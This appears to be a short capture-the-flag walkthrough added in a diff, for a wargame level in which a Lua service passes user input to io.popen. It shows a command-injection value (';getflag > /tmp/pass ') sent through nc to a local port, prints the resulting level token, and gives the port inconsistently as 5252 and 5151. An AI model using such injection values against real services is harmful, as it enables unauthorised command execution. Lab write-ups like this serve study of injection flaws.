@@ -1,0 +1,12 @@
+1. cat the file, we read the code,it is a lua scripting.
+  from the code we know there's network port 5252 open on localhost
+2. we try nc 127.0.0.1 5151
+  we got passward: , we type anything, we've Erf nope..
+3. read the code again
+  io.popen("echo "..pass.." | sha1sum", "r")
+  from the Official Documentation of Lua https://www.lua.org/manual/5.3/manual.html#pdf-io.popen  post we understand that the function popen executes the argument passed to it in the shell. and then the result is read and return to the caller.
+4. nc 127.0.0.1 5151 try again
+5.\';getflag > /tmp/pass \'        when ask for pass
+6. cat /tmp/pass, weh have
+  Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+  it is the token for level12
